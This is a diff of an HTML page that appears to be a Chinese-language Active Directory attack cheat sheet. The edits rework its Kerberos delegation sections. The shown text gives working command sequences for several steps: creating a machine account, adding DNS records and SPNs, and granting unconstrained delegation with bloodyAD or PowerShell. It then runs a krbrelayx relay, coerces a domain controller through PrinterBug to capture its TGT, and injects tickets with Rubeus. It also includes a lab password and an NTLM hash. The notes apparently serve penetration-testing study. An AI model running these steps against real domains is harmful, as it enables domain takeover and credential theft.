@@ -926,8 +926,8 @@
 </h3><p>powerview</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Get-DomainUser -TrustedToAuth
 </span></span></code></pre></div><p>nxc</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap 192.168.117.70 -u Offsec -p lab --find-delegation
-</span></span><span style="display:flex;"><span>nxc ldap 192.168.146.130 -u WEB01$ -H <span style="color:#e6db74">&#34;2a737d391120eb331dbe3d39573f0fdb&#34;</span> --find-delegation
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass --find-delegation
+</span></span><span style="display:flex;"><span>nxc ldap $ip -u $user -H <span style="color:#e6db74">&#34;</span>$hash<span style="color:#e6db74">&#34;</span> --find-delegation
 </span></span></code></pre></div><h3 id="基于资源委派rbcd">基于资源委派(RBCD)
 </h3><p>查找创建机器权限</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass -M maq
@@ -2277,23 +2277,34 @@ nxc</p>
 <h4 id="创建无约束委派">创建无约束委派
 </h4><p>要求：允许创建机器用户，允许添加dns记录，必须使用我们创建的机器，不然dns配置无效
 使用工具：krbrelayx BloodyAD Impacket</p>
-<p>首先创建机器用户</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-addcomputer -computer-name FS01 -computer-pass WACKmaker!1 -dc-ip $ip $domain/$user:$pass
+<p>k工具地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>https://github.com/dirkjanm/krbrelayx#
+</span></span></code></pre></div><p>检测权限</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc ldap $ip -u $user -p $pass -M maq
+</span></span></code></pre></div><p>首先创建机器用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>impacket-addcomputer -computer-name FS01 -computer-pass <span style="color:#e6db74">&#39;wackwack1$&#39;</span> -dc-ip $ip $domain/$user:$pass
 </span></span></code></pre></div><p>添加dns记录</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>uv run --script /opt/krbrelayx/dnstool.py -u $DOMAIN<span style="color:#ae81ff">\&#34;</span>FS01<span style="color:#e6db74">$&#34; -p &#34;</span>WACKmaker!1<span style="color:#e6db74">&#34; --action add --record FS01.</span>$domain<span style="color:#e6db74"> --data </span>$kali_ip<span style="color:#e6db74"> --type A -dns-ip </span>$DC_ip<span style="color:#e6db74"> </span>$DC_FQDN<span style="color:#e6db74">
-</span></span></span></code></pre></div><p>查询dns记录是否配置完毕</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>dig @$DC_ip FS01.$domain +noall +answer
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># 看到指定的是我们的kali——ip则正确</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#75715e"># 这里有两个要点，1需要在hosts配置dc的fqdn，2尽量使用完整参数，不要使用变量，我这个是演示原因</span>
+</span></span><span style="display:flex;"><span>python3 dnstool.py -u $DOMAIN<span style="color:#ae81ff">\&#34;</span>FS01$<span style="color:#e6db74">&#34; -p &#39;wackwack1</span>$<span style="color:#e6db74">&#39; --action add --record FS01.</span>$domain<span style="color:#e6db74"> --data </span>$kali_ip<span style="color:#e6db74"> --type A -dns-ip </span>$DC_ip<span style="color:#e6db74"> </span>$DC_FQDN<span style="color:#e6db74">
+</span></span></span></code></pre></div><p>为这个机器用户添加spn（重要，否则spn无法查询）</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 addspn.py -u $DOMAIN<span style="color:#ae81ff">\&#34;</span>FS01$<span style="color:#e6db74">&#34; -p &#39;wackwack1</span>$<span style="color:#e6db74">&#39; -s &#39;cifs/FS01.</span>$domain<span style="color:#e6db74">&#39; -t FS01</span>$<span style="color:#e6db74"> -dns-ip </span>$DC_ip<span style="color:#e6db74"> </span>$DC_FQDN<span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># 也可以多追加几个，防止查询失败--additional参数指定追加
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">python3 addspn.py -u </span>$DOMAIN<span style="color:#e6db74">\&#34;FS01</span>$<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#39;wackwack1$&#39;</span> -s <span style="color:#e6db74">&#39;cifs/FS01.$domain&#39;</span> -t FS01$ -dns-ip $DC_ip $DC_FQDN --additional
 </span></span></code></pre></div><p>使用bloodyad配置无约束委派</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>bloodyAD -d $domain -u $user -p $pass --host $fqdn add uac <span style="color:#e6db74">&#39;FS01$&#39;</span> -f TRUSTED_FOR_DELEGATION
-</span></span></code></pre></div><p>启用krbrelayx来指定中继，注意这里需要我们创建机器用户的hash，可以转一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;WACKmaker!1&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
+</span></span></code></pre></div><p>或者也可以使用powershell配置无约束</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>Set-ADAccountControl -Identity FS01$ -TrustedForDelegation $true
+</span></span><span style="display:flex;"><span>Get-ADComputer -Identity FS01$ -Properties TrustedForDelegation
 </span></span></code></pre></div><p>启动中继监听</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>uv run /opt/krbrelayx/krbrelayx.py -hashes :$hash_fs01
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>python3 krbrelayx.py --krbsalt <span style="color:#e6db74">&#39;$domain+$user&#39;</span> --krbpass <span style="color:#e6db74">&#39;wackwack1$&#39;</span> --interface-ip $kali_ip
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 这里使用的用户名比较反人类，照我下面例子即可</span>
+</span></span><span style="display:flex;"><span>python3 krbrelayx.py --krbsalt <span style="color:#e6db74">&#39;DELEGATEFS01&#39;</span> --krbpass <span style="color:#e6db74">&#39;wackwack1$&#39;</span> --interface-ip 10.10.16.23
 </span></span></code></pre></div><p>使用nxc查询强制身份验证的可用模式</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>netexec smb $ip -u $user -p $pass -M coerce_plus 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip -u $user -p $pass -M coerce_plus 
 </span></span></code></pre></div><p>哪个可用选哪个，这里使用PrinterBug作为触发中继示例</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>netexec smb $ip -u <span style="color:#e6db74">&#34;FS01</span>$<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#39;WACKmaker!1&#39;</span> -M coerce_plus -o LISTENER<span style="color:#f92672">=</span>FS01.$domain METHOD<span style="color:#f92672">=</span>PrinterBug
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>nxc smb $ip -u <span style="color:#e6db74">&#34;FS01</span>$<span style="color:#e6db74">&#34;</span> -p <span style="color:#e6db74">&#39;wackwack1$&#39;</span> -M coerce_plus -o LISTENER<span style="color:#f92672">=</span>FS01.$domain METHOD<span style="color:#f92672">=</span>PrinterBug
 </span></span></code></pre></div><p>一切正常的情况下中继处会有回显，并且截获dc的tgt</p>
 <h4 id="创建约束委派">创建约束委派
 </h4><p>我还没有时间去研究远程打法（bloodyady一定能做到），所以目前先记录winrm命令打法</p>
@@ -2405,7 +2416,8 @@ nxc</p>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>.\SpoolSample.exe CDC01 APPSRV01
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Rubeus.exe ptt /ticket<span style="color:#960050;background-color:#1e0010">:</span>doIFIjCCBR.......
 </span></span></code></pre></div><h4 id="nxc加krbrelayx">nxc加krbrelayx
-</h4><p>启用krbrelayx来指定中继，注意这里需要我们配置无约束委派机器用户的hash，可以转一下</p>
+</h4><p>只做简要记录，以下操作不适用于已经创建好的实体无约束委派，具体创建可以到本地特权模块查看，以下内容以后会进行修改</p>
+<p>启用krbrelayx来指定中继，注意这里需要我们配置无约束委派机器用户的hash，可以转一下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>iconv -f ASCII -t UTF-16LE &lt;<span style="color:#f92672">(</span>printf <span style="color:#e6db74">&#34;WACKmaker!1&#34;</span><span style="color:#f92672">)</span> | openssl dgst -md4
 </span></span></code></pre></div><p>启动中继监听</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>uv run /opt/krbrelayx/krbrelayx.py -hashes :$hash_machine
